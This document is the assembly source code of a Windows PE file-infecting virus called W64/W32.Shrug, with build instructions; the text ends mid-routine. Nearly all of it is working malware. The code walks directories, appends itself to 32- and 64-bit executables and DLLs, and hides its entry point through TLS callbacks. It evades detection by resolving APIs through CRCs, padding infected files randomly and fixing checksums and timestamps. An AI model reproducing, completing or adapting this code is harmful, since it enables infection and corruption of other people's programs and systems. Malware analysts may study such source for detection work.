;W64/W32.Shrug by roy g biv
;
;some of its features:
;- parasitic direct action infector of PE exe/dll (but not looking at suffix)
;- infects files in current directory and all subdirectories
;- infects both IA32 and AMD64 files
;- directory traversal is linked-list instead of recursive to reduce stack size
;- reloc section inserter/last section appender
;- EPO (TLS infection)
;- code executes after ExitProcess() is called
;- uses CRCs instead of API names
;- uses SEH for common code exit
;- no infect files with data outside of image (eg self-extractors)
;- no infect files protected by SFC
;- infected files are padded by random amounts to confuse tail scanners
;- scans memory to find kernel address (no hard-coded addresses)
;- correct file checksum without using imagehlp.dll :) 100% correct algorithm
;---
;
;  optimisation tip: Windows appends ".dll" automatically, so this works:
;        push "cfs"
;        mov  ecx, esp
;        call LoadLibraryA
;---
;
;to build this thing:
;yasm
;----
;yasm -m amd64 -f win32 -o shrug64.obj shrug64.asm
;link shrug64.obj kernel32.lib user32.lib /section:.text,erw /entry:shrug /subsystem:console
;
;1. build shrug.asm in link_only mode
;2. run it to retrieve code size
;3. define code size here
;4. build shrug64.asm
;5. run it to create shrug64.dmp
;6. build shrug.asm in not link_only mode
;---
;
;We're in the middle of a phase transition:
;a butterfly flapping its wings at
;just the right moment could
;cause a storm to happen.
;-I'm trying to understand-
;I'm at a moment in my life-
;I don't know where to flap my wings.
;(Danny Hillis)

bits 64

extern  GlobalAlloc:proc
extern  CreateFileA:proc
extern  WriteFile:proc
extern  CloseHandle:proc
extern  GlobalFree:proc
extern  MessageBoxA:proc
extern  ExitProcess:proc

shrug_size      equ     501h                    ;replace this!

global shrug
%include "shrug64.inc"
section .text
shrug:  mov     edx, ntdcrc_count
        mov     ebx, ntdnames
        mov     edi, ntdcrcbegin
        call    create_crcs
        mov     edx, krncrc_count
        mov     ebx, krnnames
        mov     edi, krncrcbegin
        call    create_crcs
        mov     edx, 1
        mov     ebx, sfcnames
        mov     edi, sfccrcbegin
        call    create_crcs
        push    rax
        mov     edx, dword (shrug_codeend - shrug_tlscode1) * 7
        xor     ecx, ecx                        ;GMEM_FIXED
        call    GlobalAlloc
        push    rax
        mov     ecx, shrug_codeend - shrug_tlscode1
        mov     esi, shrug_tlscode1
        push    rax
        pop     rdi
        jmp     dump_line

dump_outer:
        mov     al, ','
        stosb
        test    cl, 0fh
        jne     dump_inner
        dec     rdi

dump_line:
        mov     eax, ("db" << 10h) + 0a0dh
        stosd

dump_inner:
        mov     ax, " 0"
        stosw
        lodsb
        mov     ah, al
        shr     ah, 4
        and     al, 0fh
        call    byt2asc
        mov     al, 'h'
        stosb
        loop    dump_outer
        xor     ebx, ebx
        push    rbx
        push    rbx
        push    byte CREATE_ALWAYS
        sub     rsp, byte 20h
        xor     r9, r9
        xor     r8d, r8d
        mov     edx, GENERIC_WRITE
        mov     ecx, fn_dump
        call    CreateFileA
        add     rsp, byte 38h
        xchg    ebx, eax
        pop     rdx
        push    rdx
        push    byte 0
        sub     rsp, byte 20h
        mov     r9, rsp
        sub     rdi, rdx
        mov     r8, rdi
        push    rbx
        pop     rcx
        call    WriteFile
        add     rsp, byte 28h
        push    rbx
        pop     rcx
        call    CloseHandle
        pop     rcx
        call    GlobalFree
        xor     r9d, r9d
        mov     r8d, txttitle
        mov     edx, txtbody
        xor     ecx, ecx
        call    MessageBoxA
        xor     ecx, ecx
        call    ExitProcess

fn_dump:        db      "shrug64.dmp", 0

byt2asc:
        call    nyb2asc
        xchg    ah, al

nyb2asc:
        cmp     ah, 0ah
        cmc
        push    rax
        sbb     al, al
        and     al, 7
        add     al, '0'
        add     al, ah
        stosb
        pop     rax
        ret
;nyb2asc         endp
;byt2asc         endp
;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;code begins here in existing TLS callback pointer
;-----------------------------------------------------------------------------

shrug32_tlscode1        equ     0
tlsdata                 equ     0ch
host_patch32            equ     44h
shrug32_tlscode2        equ     4bh
sfc_os                  equ     146h

shrug_tlscode1:
        pop     rax                             ;needed return address
        push    rax

host_patch:
        lea     rcx, qword [RIP + do_message - $ - 7]
                                                ;replaced dynamically
        push    rcx
        jmp     shrug_common

shrug_fixrsp:
        add     rsp, ((findlist_size - 9) & -8) + ntdcrcstk_size + 10h + krncrcstk_size
        mov     r9, qword [rsp]
        pop     rdi
        mov     r8, qword [rsp]
        pop     rdi
        pop     rdi
        pop     rsi
        pop     rbp
        pop     rbx

shrug_dllret:
        ret

;-----------------------------------------------------------------------------
;code begins here in created TLS directory / callback pointer
;-----------------------------------------------------------------------------

shrug_tlscode2:                                 ;rcx = DllHandle, rdx = Reason, r8 = Reserved
        pop     rax                             ;needed return address
        push    rax

shrug_common:
        test    dl, DLL_PROCESS_ATTACH | DLL_THREAD_ATTACH
        jne     shrug_dllret                    ;execute only on PROCESS_DETACH
        push    rbx
        push    rbp
        push    rsi
        push    rdi
        push    rax
        mov     qword [rsp], r8
        push    rax
        mov     qword [rsp], r9
        enter   (findlist_size - 9) & -8, 0     ;Windows XP/2003 enables alignment check exception
                                                ;so some APIs fail if buffer is not dword aligned
                                                ;-9 to align at 2 qwords earlier
                                                ;because EBP saved automatically
                                                ;and other register saved next
        push    byte 0                          ;zero findprev in findlist
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

ntdcrcbegin:                                    ;place < 80h bytes from call for smaller code
        times (ntdcrc_count + 1) dd 0
ntdcrcend:
        dq      load_krn - ntdcrcend + 4

init_findmz:
        lea     rdi, qword [rax + 1]

find_mzhdr:

;-----------------------------------------------------------------------------
;do not use hard-coded kernel address values because it is not portable
;Microsoft used all different values for 95, 98, NT, 2000, Me, XP, 2003
;they will maybe change again for every new release
;-----------------------------------------------------------------------------

        dec     rdi                             ;sub 64kb
        xor     di, di                          ;64kb align
        call    is_pehdr
        jne     find_mzhdr
        push    rdi
        pop     rbx
        pop     rdi

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

        lodsq
        mov     esi, dword [rsi + pehdr64.pe64export + pedir.dirrva - pehdr64.pe64coff - 8]
        lea     rsi, qword [rbx + rsi + peexp.expadrrva]
        xor     rax, rax
        lodsd                                   ;Export Address Table RVA
        lea     rdx, qword [rbx + rax]
        lodsd                                   ;Name Pointer Table RVA
        lea     rcx, qword [rbx + rax]
        lodsd                                   ;Ordinal Table RVA
        lea     rbp, qword [rbx + rax]
        push    rcx
        pop     rsi

push_export:
        push    rcx

get_export:
        lodsd
        push    rbx
        add     rbx, rax                        ;Name Pointer VA
        or      eax, byte -1

crc_outer:
        xor     al, byte [rbx]
        push    byte 8
        pop     rcx

crc_inner:
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip:
        loop    crc_inner
        sub     cl, byte [rbx]                  ;carry set if not zero
        inc     rbx                             ;carry not altered by inc
        jb      crc_outer
        pop     rbx
        cmp     dword [rdi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     rcx
        push    rsi
        pop     rax
        sub     rax, rcx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word [rbp + rax - 2]       ;get export ordinal
        mov     eax, dword [rax * 4 + rdx]      ;get export RVA
        add     rax, rbx
        push    rax
        scasd
        cmp     dword [rdi], byte 0
        jne     push_export
        add     rdi, qword [rdi + 4]
        jmp     rdi

;-----------------------------------------------------------------------------
;get imagebase of kernel32 for familiar APIs, rather than calling through ntdll
;this is required because it is ntdll that calls the TLS entrypoint
;-----------------------------------------------------------------------------

load_krn:
        call    skip_krn
        dw      'k', 'e', 'r', 'n', 'e', 'l', '3', '2'

skip_krn:
        push    dword 120010h
        mov     r8, rsp
        push    rax
        mov     r9, rsp
        xor     edx, edx
        push    byte 1
        pop     rcx
        call    qword [rsp + 8 + ntdcrcstk.kLdrGetDllHandle]
        pop     rax
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin:                                    ;place < 80h bytes from call for smaller code
        times (krncrc_count + 1) dd 0
krncrcend:
        dq      check_sfc - krncrcend + 4

;-----------------------------------------------------------------------------
;get SFC support
;-----------------------------------------------------------------------------

check_sfc:
        lea     rcx, qword [RIP + shrug_tlscode1 - $ - shrug_size + sfc_os - 7]
        call    qword [rsp - 8 + krncrcstk.kLoadLibraryA]
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

sfccrcbegin:                                    ;place < 80h bytes from call for smaller code
        dd      0, 0
sfccrcend:
        dq      scan_dirinit - sfccrcend + 4

;-----------------------------------------------------------------------------
;non-recursive directory traverser
;-----------------------------------------------------------------------------

scan_dirinit:
        lea     rbp, qword [rsp + krncrcstk.kGlobalAlloc]
                                                ;position about halfway, to reduce code size
        lea     rsi, qword [rbp + krncrcstk_size - krncrcstk.kGlobalAlloc + ntdcrcstk_size]

scan_dir:                                       ;rbp -> platform APIs, rsi -> findlist
        push    byte '*'                        ;ANSI-compatible Unicode findmask
        lea     rbx, qword [rsi + findlist.finddata]
        push    rbx
        pop     rdx
        push    rsp
        pop     rcx
        call    qword [rbp + krncrcstk.kFindFirstFileW - krncrcstk.kGlobalAlloc]
        pop     rcx
        mov     qword [rsi + findlist.findhand], rax
        inc     rax
        je      find_prev

        ;you must always step forward from where you stand

test_dirfile:
        mov     eax, dword [rbx + WIN32_FIND_DATA.dwFileAttributes]
        lea     rdi, qword [rsi + findlist.finddata + WIN32_FIND_DATA.cFileName]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        je      test_file
        cmp     byte [rdi], '.'                 ;ignore . and .. (but also .* directories under NT/2000/XP)
        je      find_next

;-----------------------------------------------------------------------------
;enter subdirectory, and allocate another list node
;-----------------------------------------------------------------------------

        push    rdi
        pop     rcx
        call    qword [rbp + krncrcstk.kSetCurrentDirectoryW - krncrcstk.kGlobalAlloc]
        xchg    ecx, eax
        jecxz   find_next
        push    rax
        mov     edx, findlist_size
        xor     ecx, ecx                        ;GMEM_FIXED
        call    qword [rbp + krncrcstk.kGlobalAlloc - krncrcstk.kGlobalAlloc]
        xchg    rcx, rax
        pop     rax
        jecxz   step_updir
        xchg    rsi, rcx
        mov     qword [rsi + findlist.findprev], rcx
        jmp     scan_dir

find_next:
        lea     rbx, qword [rsi + findlist.finddata]
        mov     rdi, qword [rsi + findlist.findhand]
        push    rbx
        pop     rdx
        push    rdi
        pop     rcx
        call    qword [rbp + krncrcstk.kFindNextFileW - krncrcstk.kGlobalAlloc]
        test    eax, eax
        jne     test_dirfile

;-----------------------------------------------------------------------------
;close find, and free list node if not list head
;-----------------------------------------------------------------------------

        push    rdi
        pop     rcx
        call    qword [rbp + krncrcstk.kFindClose - krncrcstk.kGlobalAlloc]

find_prev:
        mov     rax, qword [rsi + findlist.findprev]
        test    rax, rax
        je      shrug_fixrsp                    ;game over
        push    rax
        xchg    rsi, rax
        call    qword [rbp + krncrcstk.kGlobalFree - krncrcstk.kGlobalAlloc]
        pop     rax

step_updir:

;-----------------------------------------------------------------------------
;the ANSI string ".." can be used, even on Unicode platforms
;-----------------------------------------------------------------------------

        push    dword '..'
        push    rsp
        pop     rcx
        call    qword [rbp + krncrcstk.kSetCurrentDirectoryA - krncrcstk.kGlobalAlloc]
        pop     rax
        jmp     find_next

test_file:

;-----------------------------------------------------------------------------
;get full path
;-----------------------------------------------------------------------------

        push    rax                             ;save original file attributes for close
        enter   MAX_PATH * 2, 0
        mov     r8, rsp
        push    rax
        mov     r9, rsp
        mov     edx, MAX_PATH
        push    rdi
        pop     rcx
        call    qword [rbp + 10h + krncrcstk.kGetFullPathNameW]
        pop     rax

;-----------------------------------------------------------------------------
;don't touch protected files
;-----------------------------------------------------------------------------

        push    rsp
        pop     rdx
        xor     ecx, ecx
        call    qword [rbp + 10h + krncrcstk.kSfcIsFileProtected]
        leave
        test    eax, eax
        jne     restore_attr
        xor     ebx, ebx
        call    set_fileattr
        push    rbx
        push    rbx
        push    byte OPEN_EXISTING
        sub     rsp, byte 20h
        xor     r9, r9
        xor     r8d, r8d
        mov     edx, GENERIC_READ | GENERIC_WRITE
        push    rdi
        pop     rcx
        call    qword [rbp + krncrcstk.kCreateFileW - krncrcstk.kGlobalAlloc]
        add     rsp, byte 38h
        xchg    ebx, eax
        call    test_infect
        db      81h                             ;mask CALL
        call    infect_file                     ;Super Nashwan power ;)
        lea     r9, qword [rsi + findlist.finddata + WIN32_FIND_DATA.ftLastWriteTime]
        lea     r8, qword [rsi + findlist.finddata + WIN32_FIND_DATA.ftLastAccessTime]
        cqo
        push    rbx
        pop     rcx
        call    qword [rbp + krncrcstk.kSetFileTime - krncrcstk.kGlobalAlloc]
        push    rbx
        pop     rcx
        call    qword [rbp + krncrcstk.kCloseHandle - krncrcstk.kGlobalAlloc]

restore_attr:
        pop     rbx                             ;restore original file attributes
        call    set_fileattr
        jmp     find_next
;scan_dir        endp

;-----------------------------------------------------------------------------
;look for MZ and PE file signatures
;-----------------------------------------------------------------------------

is_pehdr:                                       ;rdi -> map view
        cmp     word [rdi], 'MZ'                ;Windows does not check 'ZM'
        jne     pehdr_ret
        movzx   rsi, word [rdi + mzhdr.mzlfanew]
        cmp     word [rdi], si
        jb      pehdr_ret
        add     rsi, rdi
        lodsd                                   ;SEH protects against bad lfanew value
        add     eax, -'PE'                      ;anti-heuristic test filetype ;) and clear EAX

pehdr_ret:
        ret                                     ;if PE file, then eax = 0, rsi -> COFF header, Z flag set
;is_pehdr        endp

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

set_fileattr:                                   ;ebx = file attributes, rsi -> findlist, rbp -> platform APIs
        lea     rdi, qword [rsi + findlist.finddata + WIN32_FIND_DATA.cFileName]
        mov     edx, ebx
        push    rdi
        pop     rcx
        call    qword [rbp + krncrcstk.kSetFileAttributesW - krncrcstk.kGlobalAlloc]
        ret
;set_fileattr    endp

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, x86-64, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_infect:                                    ;ebx = file handle, rsi = findlist, rbp -> platform APIs
        call    map_view
        push    rsi
        pop     rbp
        call    is_pehdr
        jne     inftest_ret
        lodsd
        sub     ax, IMAGE_FILE_MACHINE_I386
        je      inftest_ia32                    ;only Intel 386+
        cmp     ax, IMAGE_FILE_MACHINE_AMD64 - IMAGE_FILE_MACHINE_I386
        jne     inftest_ret                     ;only AMD x86-64
        mov     ax, 4                           ;not al, must clear some ah bits

inftest_ia32:
        movzx   rdi, al
        shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
        lea     edx, dword [rax * 4 + rax]      ;complete multiply by 28h (size pesect)
        mov     ecx, dword [rsi + coffhdr.peflags - coffhdr.petimedate]

;-----------------------------------------------------------------------------
;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
;32-bit executable file if Intel, only executable file if AMD
;-----------------------------------------------------------------------------

        test    ch, IMAGE_FILE_32BIT_MACHINE >> 8
        jne     inftest_flags
        test    di, di
        je      inftest_ret

inftest_flags:
        and     cx, IMAGE_FILE_SYSTEM | IMAGE_FILE_UP_SYSTEM_ONLY | IMAGE_FILE_EXECUTABLE_IMAGE
        cmp     cx, byte IMAGE_FILE_EXECUTABLE_IMAGE
        jne     inftest_ret
        add     rsi, byte (pehdr.pesubsys - pehdr.pemagic + coffhdr_size - coffhdr.petimedate)

;-----------------------------------------------------------------------------
;the COFF magic value is not checked because Windows ignores it anyway
;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
;-----------------------------------------------------------------------------

        lodsd
        cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
        jnbe    inftest_ret
        cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
        jb      inftest_ret
        shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
        jb      inftest_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        cmp     dword [rdi * 4 + rsi + pehdr.pesecurity + pedir.dirrva - pehdr.pestackmax], eax
        jnbe    inftest_ret

;-----------------------------------------------------------------------------
;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
;the Optional Header can be larger than the offset of the last directory
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        movzx   rax, word [rsi + pehdr.pecoff + coffhdr.peopthdrsize - pehdr.pestackmax]
        add     eax, edx
        mov     ebx, dword [rsi + pehdr.pefilealign - pehdr.pestackmax]
        lea     rsi, qword [rsi + rax - pehdr.pestackmax + pehdr.pemagic - pesect_size + pesect.sectrawsize]
        lodsd
        add     eax, dword [rsi]
        cmp     dword [rbp + findlist.finddata + WIN32_FIND_DATA.dwFileSizeLow], eax
        jne     inftest_ret                     ;file contains appended data
        add     dword [rbp + findlist.finddata + WIN32_FIND_DATA.dwFileSizeLow], ebx
        inc     dword [rsp + mapsehstk.mapsehinfret]
                                                ;skip call mask

inftest_ret:
        int     3

;-----------------------------------------------------------------------------
;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged
;-----------------------------------------------------------------------------

open_append:
        call    qword [rbp + krncrcstk.kGetTickCount - krncrcstk.kGlobalAlloc]
        and     eax, RANDPADMAX - 1
        add     ax, shrug_codeend - shrug_tlscode1 + shrug_size + RANDPADMIN

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view:                                       ;eax = extra bytes to map, ebx = file handle, rsi -> findlist, rbp -> platform APIs
        add     eax, dword [rsi + findlist.finddata + WIN32_FIND_DATA.dwFileSizeLow]
        lea     rdx, qword [RIP + unmap_seh - $ - 7]
        mov     ecx, eax                        ;non-zero
        xor     rdi, rdi
        xchg    edi, eax
        call    qword [rbp + krncrcstk_size - krncrcstk.kGlobalAlloc + ntdcrcstk.kRtlAddVectoredExceptionHandler]
        pop     rcx
        push    rax
        push    rcx
        xor     rdx, rdx
        push    rdx
        push    rdi
        sub     rsp, byte 20h
        xor     r9d, r9d
        mov     r8d, PAGE_READWRITE
        push    rbx
        pop     rcx
        call    qword [rbp + krncrcstk.kCreateFileMappingA - krncrcstk.kGlobalAlloc]
                                                ;ANSI map is allowed because of no name
        push    rax
        push    rdi
        sub     rsp, byte 20h
        xor     r9d, r9d
        xor     r8d, r8d
        push    byte FILE_MAP_WRITE
        pop     rdx
        xchg    rcx, rax
        call    qword [rbp + krncrcstk.kMapViewOfFile - krncrcstk.kGlobalAlloc]
        xchg    rdi, rax                        ;should succeed even if file cannot be opened
        mov     rdx, qword [rsp + 60h]
        push    rbx
        push    rbp
        push    rsi
        push    rdi
        mov     qword [RIP + unmap_view - $ - 5], rsp
        jmp     rdx

unmap_seh:
        lea     rax, qword [RIP + unmap_view - $ - 7]
        mov     rcx, qword [rcx + EXCEPTION_POINTERS.ContextRecord]
        mov     qword [rcx + ContextRecord_RIP], rax
        or      eax, byte -1                    ;EXCEPTION_CONTINUE_EXECUTION
        ret

unmap_view:
        mov     rsp, "rgb!"
        pop     rdi
        pop     rsi
        pop     rbp
        pop     rbx
        mov     rcx, qword [rsp + 68h]
        call    qword [rbp + krncrcstk_size - krncrcstk.kGlobalAlloc + ntdcrcstk.kRtlRemoveVectoredExceptionHandler]
        push    rdi
        pop     rcx
        call    qword [rbp + krncrcstk.kUnmapViewOfFile - krncrcstk.kGlobalAlloc]
        mov     rcx, qword [rsp + 28h]       
        call    qword [rbp + krncrcstk.kCloseHandle - krncrcstk.kGlobalAlloc]
        add     rsp, byte 70h
        ret
;unmap_view      endp
;unmap_seh       endp
;map_view        endp                            ;eax = new file size, rdi = map view
;open_append     endp

;-----------------------------------------------------------------------------
;infect file using TLS method
;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
;               bytes) to confuse scanners that look at end of file (also
;               infection marker)
;               if reloc table is not in last section (taken from relocation
;               field in PE header, not section name), then append to last
;               section.  otherwise, move relocs down and insert code into
;               space (to confuse people looking at end of file.  they will
;               see only relocation data and many zeroes)
;infection:     Entry Point Obscured via TLS callback function
;               if no TLS directory exists, then one will be created, with a
;               single callback function that points to this code
;               if a TLS directory exists, but no callback functions exist,
;               then a function pointer will be created that points to this
;               code
;               else if a TLS directory and callback functions exist, then the
;               first function pointer will be altered to point to this code
;-----------------------------------------------------------------------------

infect_file:                                    ;rsi -> findlist, rdi = map view
        call    open_append
        push    rax
        push    rdi
        mov     ebx, dword [rdi + mzhdr.mzlfanew]
        lea     rbx, qword [rbx + rdi + pehdr.pechksum]
        xor     rcx, rcx
        imul    cx, word [rbx + pehdr.pecoff + coffhdr.pesectcount - pehdr.pechksum], byte pesect_size
        add     cx, word [rbx + pehdr.pecoff + coffhdr.peopthdrsize - pehdr.pechksum]
        lea     rsi, qword [rbx + rcx + pehdr.pemagic - pehdr.pechksum - pesect_size + pesect.sectrawsize]
        lodsd
        mov     cx, shrug_codeend - shrug_tlscode1 + shrug_size
        mov     edx, dword [rbx + pehdr.pefilealign - pehdr.pechksum]
        push    rax
        add     eax, ecx
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx                        ;file align last section
        mov     dword [rsi + pesect.sectrawsize - pesect.sectrawaddr], eax

;-----------------------------------------------------------------------------
;raw size is file aligned.  virtual size is not required to be section aligned
;so if old virtual size is larger than new raw size, then size of image does
;not need to be updated, else virtual size must be large enough to cover the
;new code, and size of image is section aligned
;-----------------------------------------------------------------------------

        mov     ebp, dword [rsi + pesect.sectvirtaddr - pesect.sectrawaddr]
        cmp     dword [rsi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        jnb     test_reloff
        mov     dword [rsi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        add     eax, ebp
        mov     edx, dword [rbx + pehdr.pesectalign - pehdr.pechksum]
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx
        mov     dword [rbx + pehdr.peimagesize - pehdr.pechksum], eax

;-----------------------------------------------------------------------------
;if relocation table is not in last section, then append to last section
;otherwise, move relocations down and insert code into space
;-----------------------------------------------------------------------------

test_reloff:
        test    byte [rbx + pehdr.pecoff + coffhdr.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
        jne     copy_code
        cqo
        cmp     byte [rbx + pehdr.pecoff + coffhdr.pemachine - pehdr.pechksum], IMAGE_FILE_MACHINE_I386 & 0ffh
        je      infect_ia32
        mov     dl, (pehdr64.pe64reloc - pehdr64.pe64chksum) - (pehdr.pereloc - pehdr.pechksum)

infect_ia32:
        cmp     dword [rdx + rbx + pehdr.pereloc + pedir.dirrva - pehdr.pechksum], ebp
        jb      copy_code
        mov     eax, dword [rsi + pesect.sectvirtsize - pesect.sectrawaddr]
        add     eax, ebp
        cmp     dword [rdx + rbx + pehdr.pereloc + pedir.dirrva - pehdr.pechksum], eax
        jnb     copy_code
        add     dword [rdx + rbx + pehdr.pereloc + pedir.dirrva - pehdr.pechksum], ecx
        pop     rax
        push    rsi
        mov     esi, dword [rsi]
        add     rdi, rsi
        lea     rsi, qword [rdi + rax - 1]
        lea     rdi, qword [rsi + rcx]
        xchg    ecx, eax
        std
        rep     movsb
        cld
        pop     rsi
        pop     rdi
        push    rdi
        push    rcx
        xchg    ecx, eax

copy_code:
        pop     rdx
        add     ebp, edx
        xchg    ebp, eax
        add     edx, dword [rsi]
        add     rdi, rdx
        push    rsi
        push    rdi
        lea     rsi, qword [RIP + shrug_tlscode1 - $ - shrug_size - 7]
        rep     movsb
        pop     rdi
        pop     rsi

;-----------------------------------------------------------------------------
;section attributes are always altered to executable because AMD64 will require it
;always altered to writable because VectoredExceptionHandler requires stack pointer
;the write bit could be set at runtime but we lost anti-heuristic already
;-----------------------------------------------------------------------------

        or      byte [rsi + pesect.sectflags - pesect.sectrawaddr + 3], (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE) >> 18h
        cmp     byte [rbx + pehdr.pecoff + coffhdr.pemachine - pehdr.pechksum], IMAGE_FILE_MACHINE_AMD64 & 0ffh
        je      infect_amd64

;-----------------------------------------------------------------------------
;if 32-bit tls directory exists...
;-----------------------------------------------------------------------------

        mov     ebp, dword [rbx + pehdr.peimagebase - pehdr.pechksum]
        mov     ecx, dword [rbx + pehdr.petls + pedir.dirrva - pehdr.pechksum]
        jrcxz   add_tlsdir                      ;size field is never checked
        call    rva2raw
        pop     rdx
        push    rdx
        add     eax, ebp
        push    rax
        lea     rax, qword [rdx + rcx + tlsstruc.tlsfuncptr]
        mov     ecx, dword [rax]
        jrcxz   store_func
        sub     ecx, ebp
        call    rva2raw
        add     rdx, rcx                        ;do not combine
        mov     ecx, dword [rdx]                ;current rdx used by alter_func

        ;it is impossible if it passes unattempted

store_func:
        test    rcx, rcx
        pop     rcx
        xchg    rcx, rax
        jne     alter_func
        add     eax, byte (tlsdata - shrug32_tlscode1 + tlsstruc.tlsfunc)
        mov     dword [rcx], eax
        add     rdi, byte (tlsdata - shrug32_tlscode1 + tlsstruc.tlsfunc)
        jmp     set_funcptr

alter_func:
        xchg    dword [rdx], eax
        sub     eax, byte (tlsdata - shrug32_tlscode1)
        sub     eax, dword [rdx]
        mov     dword [rdi + host_patch32 - shrug32_tlscode1 + 3], eax
        jmp     jmp_checksum

add_tlsdir:
        add     eax, byte (tlsdata - shrug32_tlscode1)
        mov     dword [rbx + pehdr.petls + pedir.dirrva - pehdr.pechksum], eax
        lea     eax, dword [rbp + rax + tlsstruc.tlsflags]
        add     rdi, byte (tlsdata - shrug32_tlscode1 + tlsstruc.tlsindex)
        stosd
        add     eax, byte (tlsstruc.tlsfunc - tlsstruc.tlsflags)
        stosd
        scasq

set_funcptr:
        add     eax, byte (shrug32_tlscode2 - tlsdata - tlsstruc.tlsfunc)
        stosd

jmp_checksum:
        jmp     checksum_file

;-----------------------------------------------------------------------------
;if 64-bit tls directory exists...
;-----------------------------------------------------------------------------

infect_amd64:
        mov     rbp, qword [rbx + pehdr64.pe64imagebase - pehdr64.pe64chksum]
        mov     ecx, dword [rbx + pehdr64.pe64tls + pedir.dirrva - pehdr64.pe64chksum]
        jrcxz   add_tlsdir64                    ;size field is never checked
        call    rva2raw
        pop     rdx
        push    rdx
        add     rax, rbp
        push    rax
        lea     rax, qword [rdx + rcx + tlsstruc64.tls64funcptr]
        mov     rcx, qword [rax]
        jrcxz   store_func64
        sub     rcx, rbp
        call    rva2raw
        add     rdx, rcx                        ;do not combine
        mov     rcx, qword [rdx]                ;current rdx used by alter_func

        ;it is impossible if it passes unattempted

store_func64:
        test    rcx, rcx
        pop     rcx
        xchg    rcx, rax
        jne     alter_func64
        add     rax, byte (tlsdata - shrug32_tlscode1 + tlsstruc64.tls64func)
        mov     qword [rcx], rax
        add     rdi, byte (tlsdata - shrug32_tlscode1 + tlsstruc64.tls64func)
        jmp     set_funcptr

alter_func64:
        add     rax, dword shrug_size
        xchg    qword [rdx], rax
        sub     eax, byte (host_patch - shrug_tlscode1 + 7)
        sub     eax, dword [rdx]
        mov     dword [rdi + host_patch - shrug_tlscode1 + 3], eax
        jmp     checksum_file

add_tlsdir64:
        add     eax, byte (tlsdata - shrug32_tlscode1)
        mov     dword [rbx + pehdr64.pe64tls + pedir.dirrva - pehdr64.pe64chksum], eax
        lea     rax, qword [rbp + rax + tlsstruc64.tls64flags]
        add     rdi, byte (tlsdata - shrug32_tlscode1 + tlsstruc64.tls64index)
        stosq
        add     rax, byte (tlsstruc64.tls64func - tlsstruc64.tls64flags)
        stosq
        scasq

set_funcptr64:
        add     rax, dword (shrug_tlscode2 - shrug_tlscode1 + shrug_size - tlsdata - tlsstruc64.tls64func)
        stosq

checksum_file:
        pop     rdi

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xor     ecx, ecx
        xchg    dword [rbx], ecx
        jrcxz   infect_ret
        xor     eax, eax
        pop     rcx
        push    rcx
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum:
        adc     ax, word [rdi]
        inc     edi
        inc     edi
        loop    calc_checksum
        pop     rcx
        adc     eax, ecx
        mov     dword [rbx], eax                ;avoid common bug.  ADC not ADD

infect_ret:
        int     3                               ;common exit using SEH
        db      "*4U2NV*"                       ;that is, unless you're reading this
;test_infect     endp

;-----------------------------------------------------------------------------
;convert relative virtual address to raw file offset
;-----------------------------------------------------------------------------

rvaloop:
        sub     rsi, byte pesect_size
        db      3ch                             ;mask PUSH ESI
rva2raw:                                        ;ecx = RVA, esi -> last section header
        push    rsi
        cmp     dword [rsi + pesect.sectvirtaddr - pesect.sectrawaddr], ecx
        jnbe    rvaloop
        sub     ecx, dword [rsi + pesect.sectvirtaddr - pesect.sectrawaddr]
        add     ecx, dword [rsi]
        pop     rsi
        ret
;rva2raw        endp

        ;When last comes to last,
        ;  I have little power:
        ;  I am merely an urn.
        ;I hold the bone-sap of myself,
        ;  And watch the marrow burn.
        ;
        ;When last comes to last,
        ;  I have little strength:
        ;  I am only a tool.
        ;I work its work; and in its hands
        ;  I am the fool.
        ;
        ;When last comes to last,
        ;  I have little life.
        ;  I am simply a deed:
        ;an action done while courage holds:
        ;  A seed.
        ;(Stephen Donaldson)

shrug_codeend:
;shrug_common    endp
;shrug_dllcode   endp
;shrug_tlscode   endp

create_crcs:
        or      eax, byte -1

create_outer:
        xor     al, byte [ebx]
        push    byte 8
        pop     rcx

create_inner:
        add     eax, eax
        jnb     create_skip
